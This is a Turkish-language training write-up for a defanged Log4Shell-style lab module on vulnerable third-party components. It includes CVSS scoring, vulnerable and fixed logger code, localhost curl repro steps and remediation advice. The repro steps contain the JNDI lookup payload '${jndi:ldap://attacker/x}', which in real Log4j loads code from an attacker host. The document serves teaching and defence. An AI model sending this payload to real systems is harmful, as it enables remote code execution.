# [A03:2025] Software Supply Chain Failures → Vulnerable Component (Log4Shell tarzı)

**Modül:** 03-software-supply-chain-failures
**Senaryo:** Uygulama, log almak için zafiyetli bir üçüncü taraf kütüphaneye (`vulnerable_logger`) bağımlıdır. `POST /log`, kullanıcı mesajını doğrudan bu kütüphaneye geçirir; kütüphane mesaj içindeki `${...}` ifadelerini "değerlendirdiği" için kullanıcı girdisi yürütme yoluna girer (Log4j / Log4Shell, CVE-2021-44228 deseni).
**Durum:** Tamamlandı (curl ile doğrulandı: vulnerable + fixed).

> ⚠️ **DEFANGED SIMULATION:** Bu senaryoda hiçbir gerçek RCE, ağ isteği veya kod çalıştırma yoktur. Zafiyetli `vulnerable_logger`, `${...}` ifadesini yorumlama noktasına geldiğinde gerçek eylem yerine `"[SİMÜLASYON] Burada RCE tetiklenirdi: ..."` metni döndürür. Amaç, zafiyetin **mekanizmasını** (girdinin veri değil, yürütülecek ifade olarak ele alınması) güvenle göstermektir.

## Bu Kategori Nedir?
Uygulamanın kendi kodu güvenli olsa bile, kullandığı bağımlılıklar (kütüphaneler, paketler, build araçları) güvenli olmayabilir. Log4Shell, SolarWinds, npm worm'ları gerçek örneklerdir. Temel korunma: SBOM (Software Bill of Materials), bağımlılık taraması (SCA), imza/provenance doğrulama, sürüm pinleme.

## CVSS 3.1
- **Skor:** 9.8 (Critical) — *simüle edilen gerçek zafiyetin skoru; bu eğitim ortamında etki defanged'dır.*
- **Vektör:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Gerekçe (gerçek Log4Shell karşılığı):**
- **AV:N** — `POST /log` HTTP üzerinden erişilebilir.
- **AC:L** — Tek gereken, log'lanacak bir alana `${...}` ifadesi yerleştirmek.
- **PR:N / UI:N** — Anonim, etkileşimsiz.
- **S:U** — Etki uygulama sınırında modellendi (gerçekte yatay hareketle S:C'ye çıkabilir).
- **C:H / I:H / A:H** — Gerçek karşılığında uzaktan kod çalıştırma → tam gizlilik/bütünlük/erişilebilirlik kaybı.

## Risk Seviyesi
- [ ] Low
- [ ] Medium
- [ ] High
- [x] Critical

## İlgili OWASP ASVS / CWE
- **OWASP ASVS 4.0.3 — V14.2.1:** *"Verify that all components are up to date, preferably using a dependency checker during build or compile time."*
- Destekleyici: **V14.2.4** — *"Verify that third party components come from pre-defined, trusted and continually maintained repositories."*
- **CWE-1395:** Dependency on Vulnerable Third-Party Component *(bu senaryonun ana CWE'si)*
- Destekleyici: **CWE-477** (Use of Obsolete Function) — kütüphanenin lookup değerlendirme özelliği, güvensiz/terk edilmesi gereken bir davranıştır.

## Açıklama
Uygulama kodunda bariz bir hata yoktur: `write_log`, gelen mesajı yalnızca `vulnerable_logger.log(...)`'a verir. Kusur, **güvenilen bağımlılığın** içindedir — kütüphane, log mesajını düz veri olarak ele almak yerine içindeki `${...}` ifadelerini ayrıştırıp "değerlendirir":

```python
# vulnerable_logger/__init__.py
_LOOKUP_PATTERN = re.compile(r"\$\{([^}]*)\}")

def _evaluate_lookup(expression):
    # DEFANGED — gerçekte JNDI/uzak sınıf yükleme → RCE
    return f"[SİMÜLASYON] Burada RCE tetiklenirdi: lookup '${{{expression}}}' ..."

def log(message):
    rendered = _LOOKUP_PATTERN.sub(lambda m: _evaluate_lookup(m.group(1)), message)
    ...
```

Bu, A03:2025'in özüdür: **sizin yazmadığınız bir bileşenin zafiyeti, sizin uygulamanızı da zafiyetli yapar.** Log4Shell'de (CVE-2021-44228) bu değerlendirme JNDI üzerinden uzak sunucudan sınıf yükleyip Remote Code Execution'a yol açıyordu.

## Repro Adımları
**Ortam:** `vulnerable/main.py`, `http://127.0.0.1:8050`.
```
uvicorn main:app --port 8050
```

1. **Zararsız log — normal davranış:**
   ```
   curl -s -X POST http://127.0.0.1:8050/log \
     -H "Content-Type: application/json" \
     -d '{"message": "user alice logged in"}'
   ```
   **Beklenen:** `{"logged": "INFO: user alice logged in"}` — girdi olduğu gibi loglanır.

2. **Log4Shell tarzı payload — zafiyet tetiklenir:**
   ```
   curl -s -X POST http://127.0.0.1:8050/log \
     -H "Content-Type: application/json" \
     -d '{"message": "login ${jndi:ldap://attacker/x}"}'
   ```
   **Beklenen:** yanıt, girdideki `${...}` ifadesinin **değerlendirildiğini** gösterir:
   ```
   INFO: login [SİMÜLASYON] Burada RCE tetiklenirdi: lookup '${jndi:ldap://attacker/x}' değerlendirilip uzak kod çalıştırılırdı
   ```
   Simülasyon metninin görünmesi, kütüphanenin kullanıcı girdisini **kod/ifade olarak yorumladığını** kanıtlar — gerçek kütüphanede bu noktada RCE olurdu.

**Test sonucu (curl ile doğrulandı):**
- **Vulnerable (8050):** `${jndi:ldap://attacker/a}` payload'ı ile yanıt → `INFO: user login [SİMÜLASYON] Burada RCE tetiklenirdi: lookup '${jndi:ldap://attacker/a}' değerlendirilip uzak kod çalıştırılırdı` — ifade **değerlendirildi**. ✅
- **Fixed (8051):** Aynı payload → `INFO: user login ${jndi:ldap://attacker/a}` — ifade **yorumlanmadı**, düz string olarak loglandı (logger `2.0.0-fixed`). ✅

## Etki
- **Uzaktan kod çalıştırma (gerçek karşılık):** Saldırgan, log'lanan herhangi bir alana (User-Agent, kullanıcı adı, arama sorgusu…) ifade yerleştirerek sunucuda kod çalıştırabilir.
- **Geniş saldırı yüzeyi:** Zafiyet uygulama mantığında değil bağımlılıkta olduğundan, girdiyi log'layan her yol potansiyel giriş noktasıdır.

## Remediation Önerisi
> **Ortak gözlem (A03:2025):** Bu senaryoda vulnerable ve fixed sürümlerin uygulama kodu (main.py) neredeyse birebir aynıdır — kusur uygulama mantığında değil, güvenilen bağımlılıkta yaşar. Bu, A03:2025'in temel önermesini somutlaştırır: remediation kod değişikliği değil, bileşenin güvenli/imzalı bir sürüme pinlenmesidir (bkz. sürüm farkları: 2.0.0-fixed, 5.2.1-verified vb.).

`fixed/main.py` uygulama kodunu neredeyse hiç değiştirmez; düzeltme **zafiyetli bileşenin güvenli sürüme pinlenmesidir** (Log4j'de 2.17.x → lookup varsayılan kapalı):

```python
# fixed vulnerable_logger v2.0.0-fixed
def log(message):
    # ${...} artık AYRIŞTIRILMAZ; mesaj literal veri olarak loglanır.
    line = f"INFO: {message}"
    ...
```

- **Sürüm pinleme:** `requirements.txt`'te bileşen güvenli sürüme sabitlenir.
- **Trusted source:** Bileşen yalnızca doğrulanmış/bakımlı depodan kurulur (ASVS V14.2.4).
- Girdi her zaman **veri** olarak ele alınmalı; log kütüphanesi asla mesaj içeriğini yorumlamamalıdır.

### Fixed Version Verification
**Ortam:** `fixed/main.py`, port `8051`.
1. Aynı Log4Shell payload'ı gönder:
   ```
   curl -s -X POST http://127.0.0.1:8051/log -H "Content-Type: application/json" \
     -d '{"message": "login ${jndi:ldap://attacker/x}"}'
   ```
   **Beklenen:** `{"logged": "INFO: login ${jndi:ldap://attacker/x}"}` — ifade **yorumlanmadan** düz string olarak loglandı; `[SİMÜLASYON]` metni **yok**.
2. `GET /status` ile sürüm doğrula: `logger_version` = `2.0.0-fixed` (vulnerable'da `1.0.0-vulnerable`).

Vulnerable sürümde ifadeyi değerlendiren aynı istek, fixed sürümde zararsız düz metne indirgeniyor.

---

## Gerçek Dünyada Tespit / Önleme
Bu senaryo, **bilinen zafiyetli bir bileşene bağımlılık** durumudur. Gerçek dünyada bu şöyle tespit/önlenir:

- **SBOM (Software Bill of Materials):** Uygulamanın tüm bağımlılıkları (ve onların bağımlılıkları) CycloneDX/SPDX formatında envanterlenir. Log4Shell krizinde, "hangi uygulamalarımda log4j var?" sorusuna dakikalar içinde yanıt verebilen ekipler SBOM'a sahip olanlardı.
- **SCA / `pip-audit`:** Software Composition Analysis araçları (Python'da `pip-audit`, genelde OWASP Dependency-Check, Snyk, GitHub Dependabot), bağımlılıkları bilinen zafiyet veritabanlarıyla (OSV, NVD/CVE) eşler. `pip-audit` build/CI aşamasında çalıştırılıp zafiyetli sürüm bulunca pipeline'ı kırabilir (ASVS V14.2.1).
- **Dependency-Track:** SBOM'ları sürekli izleyip yeni CVE yayımlandığında (Log4Shell gibi) etkilenen bileşeni kullanan tüm projeleri otomatik işaretler.
- **Sürüm pinleme + trusted source:** Bağımlılıklar tam sürüme pinlenir (`==`) ve yalnızca doğrulanmış depodan kurulur; imza & provenance (ör. Sigstore) doğrulanır (ASVS V14.2.4).
- **A03:2025 remediation bağlantısı:** "Güncel olmayan / zafiyetli bileşeni tespit et → güvenli sürüme yükselt → sürümü pinle → sürekli izle" döngüsü. Kritik nokta: yama, uygulama mantığında değil **bağımlılık yönetiminde** uygulanır.
